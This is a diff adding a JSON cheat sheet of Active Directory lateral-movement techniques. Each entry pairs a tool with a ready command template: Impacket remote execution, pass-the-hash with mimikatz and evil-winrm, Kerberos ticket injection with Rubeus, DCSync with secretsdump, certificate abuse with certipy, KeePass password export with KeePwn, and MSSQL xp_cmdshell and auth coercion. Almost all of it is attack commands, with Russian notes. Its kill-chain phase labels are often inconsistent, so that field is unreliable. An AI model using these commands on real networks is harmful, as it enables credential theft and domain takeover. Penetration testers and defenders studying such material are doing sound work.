@@ -1,0 +1,562 @@
+[
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / Interactive Shell",
+    "tool": "psexec.py (Impacket)",
+    "req": "Clear text Password",
+    "command": "psexec.py <domain>/<user>:<password>@<ip>",
+    "profit": "Authority/System",
+    "critical_note": "Получение интерактивной оболочки с правами SYSTEM через SMB.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / Interactive Shell",
+    "tool": "psexec.exe (Sysinternals)",
+    "req": "Clear text Password",
+    "command": "psexec.exe -AcceptEULA \\\\<ip>",
+    "profit": "Authority/System",
+    "critical_note": "Легитимный инструмент Microsoft для удаленного выполнения команд.",
+    "kill_chain_phase": "ACCESS"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / Pseudo-shell",
+    "tool": "wmiexec.py (Impacket)",
+    "req": "Clear text Password",
+    "command": "wmiexec.py <domain>/<user>:<password>@<ip>",
+    "profit": "Pseudo-shell (file write and read)",
+    "critical_note": "Выполнение команд через WMI (Windows Management Instrumentation), часто используется для скрытности.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / Pseudo-shell",
+    "tool": "smbexec.py (Impacket)",
+    "req": "Clear text Password",
+    "command": "smbexec.py <domain>/<user>:<password>@<ip>",
+    "profit": "Pseudo-shell (file write and read)",
+    "critical_note": "Выполнение команд через создание служб без сохранения файлов (fileless).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / WinRM",
+    "tool": "evil-winrm",
+    "req": "Clear text Password",
+    "command": "evil-winrm -i <ip> -u <user> -p <password>",
+    "profit": "Low access / Admin",
+    "critical_note": "Получение интерактивной оболочки через протокол Windows Remote Management.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / RDP",
+    "tool": "xfreerdp",
+    "req": "Clear text Password",
+    "command": "xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>",
+    "profit": "Low access / Admin (GUI)",
+    "critical_note": "Подключение к удаленному рабочему столу с использованием явных учетных данных.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / SMB / Mass Exec",
+    "tool": "nxc smb (NetExec)",
+    "req": "Clear text Password",
+    "command": "nxc smb <ip_range> -u <user> -p <password> -d <domain> -x <cmd>",
+    "profit": "Command Execution",
+    "critical_note": "Массовое выполнение команд на диапазоне IP-адресов через SMB.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "NT Hash / Pass the Hash",
+    "tool": "evil-winrm",
+    "req": "NT Hash",
+    "command": "evil-winrm -i <ip> -u <user> -H <hash>",
+    "profit": "Low access / Admin",
+    "critical_note": "Вход через WinRM с использованием хеша пароля (Pass-the-Hash).",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "NT Hash / Pass the Hash / RDP",
+    "tool": "xfreerdp & reg.py",
+    "req": "NT Hash (Restricted Admin)",
+    "command": "reg.py ... add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' -v 'DisableRestrictedAdmin' ... && xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>",
+    "profit": "Low access / Admin (GUI)",
+    "critical_note": "Включение RestrictedAdminMode через реестр и вход по RDP с использованием хеша.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "NT Hash / Overpass the Hash",
+    "tool": "getTGT.py (Impacket)",
+    "req": "NT Hash",
+    "command": "getTGT.py <domain>/<user> -hashes :<hash>",
+    "profit": "Kerberos TGT",
+    "critical_note": "Запрос Kerberos Ticket Granting Ticket (TGT) с использованием NTLM хеша.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Kerberos / Pass the Ticket",
+    "tool": "export KRB5CCNAME",
+    "req": "ccache / kirbi ticket",
+    "command": "export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache",
+    "profit": "Admin Access (via tools)",
+    "critical_note": "Импорт билета Kerberos в переменную окружения для использования инструментами Linux.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Kerberos / Pass the Ticket",
+    "tool": "Rubeus.exe",
+    "req": "Ticket (base64/file)",
+    "command": "Rubeus.exe ptt /ticket:<ticket>",
+    "profit": "Admin Access (Session)",
+    "critical_note": "Внедрение билета Kerberos в текущую сессию Windows.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Socks / Relay",
+    "tool": "proxychains secretsdump.py",
+    "req": "Socks Proxy",
+    "command": "proxychains secretsdump.py -no-pass <domain>/<user>@<ip>",
+    "profit": "DCSYNC",
+    "critical_note": "Дамп хешей через SOCKS-туннель (часто используется при NTLM Relay атаках).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Certificate / Pass the Certificate",
+    "tool": "gettgtpkinit.py (PKINIT)",
+    "req": "Certificate (pfx)",
+    "command": "gettgtpkinit.py -cert-pfx <pfx_file> -pfx-pass <cert_password> <fqdn_domain>/<user> <tgt_ccache_file>",
+    "profit": "Kerberos TGT",
+    "critical_note": "Получение TGT через PKINIT, используя сертификат PFX.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Certificate / Unpack Hash",
+    "tool": "getnthash.py",
+    "req": "Certificate (pfx)",
+    "command": "getnthash.py -key <AS-REP encryption key> <domain>/<dc_name>",
+    "profit": "NT Hash",
+    "critical_note": "Извлечение NT хеша сущности из данных, полученных через сертификат.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "MSSQL / Command Execution",
+    "tool": "mssqlclient.py",
+    "req": "MSSQL Access",
+    "command": "enable_xp_cmdshell -> xp_cmdshell <cmd>",
+    "profit": "Low Access / RCE",
+    "critical_note": "Включение расширенной процедуры xp_cmdshell для выполнения команд ОС через SQL.",
+    "kill_chain_phase": "ACCESS"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "MSSQL / Coerce Auth",
+    "tool": "mssqlclient.py",
+    "req": "MSSQL Access",
+    "command": "xp_dir_tree <ip>",
+    "profit": "COERCE SMB (Relay/Hash grab)",
+    "critical_note": "Принуждение SQL сервера к аутентификации на удаленном хосте (используется для перехвата хешей).",
+    "kill_chain_phase": "ACCESS"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / Interactive Shell",
+    "tool": "psexecsvc.py (Impacket)",
+    "req": "Clear text Password",
+    "command": "psexecsvc.py <domain>/<user>:<password>@<ip>",
+    "profit": "Authority/System",
+    "critical_note": "Управление службой PSEXESVC для выполнения команд.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / Pseudo-shell",
+    "tool": "atexec.py (Impacket)",
+    "req": "Clear text Password",
+    "command": "atexec.py <domain>/<user>:<password>@<ip> \"command\"",
+    "profit": "Authority/System",
+    "critical_note": "Выполнение команд через планировщик задач (Task Scheduler) через протокол SMB.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / Pseudo-shell",
+    "tool": "dcomexec.py (Impacket)",
+    "req": "Clear text Password",
+    "command": "dcomexec.py <domain>/<user>:<password>@<ip>",
+    "profit": "Pseudo-shell",
+    "critical_note": "Использование DCOM (Distributed Component Object Model) для удаленного выполнения команд.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / WinRM",
+    "tool": "Enter-PSSession (PowerShell)",
+    "req": "Clear text Password",
+    "command": "Enter-PSSession -ComputerName <computer> -Credential <domain>\\<user>",
+    "profit": "Low access / Admin",
+    "critical_note": "Встроенный командлет PowerShell для интерактивной сессии через WinRM.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / WinRM",
+    "tool": "nxc winrm (NetExec)",
+    "req": "Clear text Password",
+    "command": "nxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>",
+    "profit": "Low access / Admin",
+    "critical_note": "Массовое выполнение команд через WinRM с помощью NetExec.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / SMB",
+    "tool": "smbclient.py (Impacket)",
+    "req": "Clear text Password",
+    "command": "smbclient.py <domain>/<user>:<password>@<ip>",
+    "profit": "Search files",
+    "critical_note": "Интерактивный доступ к файловым шарам SMB (похож на FTP-клиент).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / SMB",
+    "tool": "smbclient-ng.py",
+    "req": "Clear text Password",
+    "command": "smbclient-ng.py -d <domain> -u <user> -p <password> --host <ip>",
+    "profit": "Search files",
+    "critical_note": "Улучшенная версия smbclient для взаимодействия с SMB-ресурсами.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Clear Text / MSSQL",
+    "tool": "nxc mssql (NetExec)",
+    "req": "Clear text Password",
+    "command": "nxc mssql <ip_range> -u <user> -p <password>",
+    "profit": "MSSQL Access",
+    "critical_note": "Проверка учетных данных и доступа к серверам MSSQL.",
+    "kill_chain_phase": "CREDS"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "NT Hash / Pass the Hash",
+    "tool": "mimikatz",
+    "req": "NT Hash",
+    "command": "mimikatz \"privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>\"",
+    "profit": "Admin Access",
+    "critical_note": "Инъекция хеша в процесс LSASS для создания новой сессии (Pass-the-Hash).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "NT Hash / Overpass the Hash",
+    "tool": "Rubeus.exe",
+    "req": "RC4 Hash (NT Hash)",
+    "command": "Rubeus.exe asktgt /user:victim /rc4:<rc4value>",
+    "profit": "Kerberos TGT",
+    "critical_note": "Запрос TGT вручную с использованием RC4-хеша учетной записи.",
+    "kill_chain_phase": "CREDS"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "NT Hash / Overpass the Hash",
+    "tool": "Rubeus.exe",
+    "req": "TGT Ticket",
+    "command": "Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe || upnpcont.exe",
+    "profit": "Admin Access",
+    "critical_note": "Создание процесса с типом логона NetworkOnly для использования билета без инъекции в текущую сессию.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Kerberos / Convert Format",
+    "tool": "ticketConverter.py (Impacket)",
+    "req": "Ticket (kirbi/ccache)",
+    "command": "ticketConverter.py <kirbi||ccache> <ccache||kirbi>",
+    "profit": "Converted Ticket",
+    "critical_note": "Конвертация билетов между форматами Linux (ccache) и Windows (kirbi).",
+    "kill_chain_phase": "CREDS"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Kerberos / Pass the Ticket",
+    "tool": "mimikatz",
+    "req": "Ticket (kirbi)",
+    "command": "mimikatz kerberos::ptc \"<ticket>\"",
+    "profit": "Admin Access",
+    "critical_note": "Pass-the-Cache: инъекция билета в текущую сессию через Mimikatz.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Kerberos / Pass the Ticket",
+    "tool": "impacket tools (generic)",
+    "req": "ccache (env var)",
+    "command": "Use -k and -no-pass for impacket",
+    "profit": "Admin Access",
+    "critical_note": "Использование инструментов Impacket с Kerberos-аутентификацией (требует переменную KRB5CCNAME).",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Kerberos / Modify SPN",
+    "tool": "tgssub.py",
+    "req": "Ticket (ccache)",
+    "command": "tgssub.py -in <ticket.ccache> -out <newticket.ccache> -altservice \"<service>/<target>\"",
+    "profit": "Pass The Ticket (Service Access)",
+    "critical_note": "Модификация Service Principal Name (SPN) в существующем сервисном билете.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Kerberos / AesKey",
+    "tool": "impacket tools / proxychains",
+    "req": "AES Key",
+    "command": "impacket tools: Use -aesKey (and use FQDN) / proxychains secretsdump.py -aesKey <key> ...",
+    "profit": "Admin Access / DCSync",
+    "critical_note": "Аутентификация с использованием ключа AES (часто требуется для новых доменов вместо NTLM).",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Socks / Relay",
+    "tool": "proxychains lookupsid.py",
+    "req": "Socks Proxy + No Pass",
+    "command": "proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids",
+    "profit": "Enumeration",
+    "critical_note": "Перечисление SID пользователей домена через туннель (Socks).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Socks / Relay",
+    "tool": "proxychains mssqlclient.py",
+    "req": "Socks Proxy + Windows Auth",
+    "command": "proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass",
+    "profit": "MSSQL Access",
+    "critical_note": "Доступ к MSSQL через прокси с Windows-аутентификацией (Relay).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Certificate / Pass the Certificate",
+    "tool": "certipy auth",
+    "req": "Certificate (pfx)",
+    "command": "certipy auth -pfx <crt_file> -dc-ip <dc_ip>",
+    "profit": "NT Hash / TGT",
+    "critical_note": "Аутентификация через сертификат для получения TGT и NTLM-хеша.",
+    "kill_chain_phase": "CREDS"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Certificate / Pass the Certificate",
+    "tool": "passthecert.py",
+    "req": "Certificate (crt/key)",
+    "command": "passthecert.py -action ldap-shell -crt <user.crt> -key <user.key> -domain <domain> -dc-ip <dc_ip>",
+    "profit": "RBCD / Shadow Creds",
+    "critical_note": "Прямое использование сертификата для операций в LDAP (например, настройка RBCD).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "MSSQL / Trust",
+    "tool": "mssqlclient.py",
+    "req": "MSSQL Access",
+    "command": "use_link -> exec_as_user / exec_as_login",
+    "profit": "Lateral Move (Trusts)",
+    "critical_note": "Использование доверительных отношений между SQL-серверами (Linked Servers) для перехода на другой хост.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "DPAPI (Triage)",
+    "tool": "SharpDPAPI.exe",
+    "req": "Local Admin / User execution",
+    "command": "SharpDPAPI.exe triage",
+    "profit": "DPAPI Blobs location",
+    "critical_note": "Поиск и каталогизация защищенных DPAPI данных на хосте (C#-инструмент).",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Crack Users Masterkey",
+    "tool": "DPAPImk2john.py",
+    "req": "Access to AppData files",
+    "command": "\"DPAPImk2john.py --preferred <preferred_file> -> DPAPImk2john.py -c domain -mk <masterkey> -S <sid>\"",
+    "profit": "DPAPI Masterkey (Cracked)",
+    "critical_note": "Подготовка мастер-ключей DPAPI для брутфорса/крекинга.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Impersonate (Recon)",
+    "tool": "nxc (NetExec)",
+    "req": "Network Admin Access",
+    "command": "nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users",
+    "profit": "List of potential targets",
+    "critical_note": "Получение списка залогиненных пользователей для выбора цели имперсонации.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Impersonate",
+    "tool": "irs.exe",
+    "req": "Local Admin",
+    "command": "irs.exe list -> irs.exe exec -p <pid> -c <command>",
+    "profit": "Code Execution as User",
+    "critical_note": "Использование инструмента IRS для инъекции команд в процесс другого пользователя.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Find Users",
+    "tool": "smbmap.py",
+    "req": "Network Access",
+    "command": "smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\\Users' --dir-only",
+    "profit": "Usernames / Home Directories",
+    "critical_note": "Поиск домашних директорий пользователей через SMB для выявления активных юзеров на хостах.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Extract Keepass",
+    "tool": "KeePwn.py (Trigger)",
+    "req": "Network Admin Access",
+    "command": "python KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>",
+    "profit": "User + Pass (Keepass DB)",
+    "critical_note": "Установка триггера в конфиг Keepass для экспорта паролей при следующем запуске.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Hybrid (Azure AD-Connect)",
+    "tool": "nxc (NetExec)",
+    "req": "Network Admin Access",
+    "command": "nxc smb <ip> -u <user> -p <password> -M msol",
+    "profit": "DCSYNC / Azure Admin",
+    "critical_note": "Модуль NetExec для извлечения учетных данных MSOL с сервера AD Connect.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Socks / Relay",
+    "tool": "proxychains smbclient.py",
+    "req": "Socks Proxy + No Pass",
+    "command": "proxychains smbclient.py -no-pass <user>@<ip>",
+    "profit": "Search files",
+    "critical_note": "Доступ к файловым шарам через SOCKS-прокси без пароля (Relay).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Socks / Relay",
+    "tool": "proxychains atexec.py",
+    "req": "Socks Proxy + No Pass",
+    "command": "proxychains atexec.py -no-pass <domain>/<user>@<ip> \"command\"",
+    "profit": "Authority/System",
+    "critical_note": "Выполнение команд через планировщик задач (Task Scheduler) через SOCKS-туннель.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Socks / Relay",
+    "tool": "proxychains smbexec.py",
+    "req": "Socks Proxy + No Pass",
+    "command": "proxychains smbexec.py -no-pass <domain>/<user>@<ip>",
+    "profit": "Authority/System",
+    "critical_note": "Fileless выполнение команд (создание служб) через SOCKS-туннель.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "NT Hash / Pass the Hash",
+    "tool": "nxc (NetExec) Generic",
+    "req": "NT Hash",
+    "command": "nxc <protocol> ... -H :<hash>",
+    "profit": "Admin Access",
+    "critical_note": "Использование хеша вместо пароля в инструменте NetExec (ранее CrackMapExec).",
+    "kill_chain_phase": "ACCESS"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Certificate / PKINIT",
+    "tool": "Rubeus.exe",
+    "req": "Certificate (pfx)",
+    "command": "Rubeus.exe asktgt /user:<username> /certificate:<pfx_file> /password:<certificate_password> /domain:<fqdn> /dc:<dc> /show",
+    "profit": "Kerberos TGT",
+    "critical_note": "Запрос TGT через Rubeus, используя сертификат.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Certificate / Schannel",
+    "tool": "certipy auth (LDAP Shell)",
+    "req": "Certificate (pfx)",
+    "command": "certipy auth -pfx <pfx_file> -ldap-shell -> add_computer -> Set RBCD",
+    "profit": "RBCD (Resource Based Constrained Delegation)",
+    "critical_note": "Использование интерактивной LDAP-оболочки Certipy для настройки делегирования (RBCD).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "Certificate / Extraction",
+    "tool": "certipy cert",
+    "req": "Certificate (pfx)",
+    "command": "certipy cert -pfx <pfx_file> -nokey -out user.crt && certipy cert -pfx <pfx_file> -nocert -out user.key",
+    "profit": "CRT + KEY files",
+    "critical_note": "Разделение PFX-контейнера на сертификат и ключ для использования инструментами вроде passthecert.py.",
+    "kill_chain_phase": "LATERAL"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "MSSQL / Recon",
+    "tool": "Cypher Query (BloodHound)",
+    "req": "BloodHound Database",
+    "command": "MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p",
+    "profit": "Users or Computers with SQL admin",
+    "critical_note": "Поиск путей атаки на SQL-администраторов через граф BloodHound.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "MSSQL / Enumeration",
+    "tool": "mssqlclient.py",
+    "req": "MSSQL Access",
+    "command": "enum_db",
+    "profit": "Database List",
+    "critical_note": "Перечисление баз данных на сервере.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "MSSQL / Enumeration",
+    "tool": "mssqlclient.py",
+    "req": "MSSQL Access",
+    "command": "enum_impersonate",
+    "profit": "Impersonation candidates",
+    "critical_note": "Поиск пользователей, которых можно имперсонировать (EXECUTE AS).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Lateral Move",
+    "attack_type": "MSSQL / Enumeration",
+    "tool": "mssqlclient.py",
+    "req": "MSSQL Access",
+    "command": "sp_linkedservers",
+    "profit": "Linked Servers List",
+    "critical_note": "Получение списка связанных серверов для дальнейшего перемещения (Lateral Move).",
+    "kill_chain_phase": "RECON"
+  }
+]
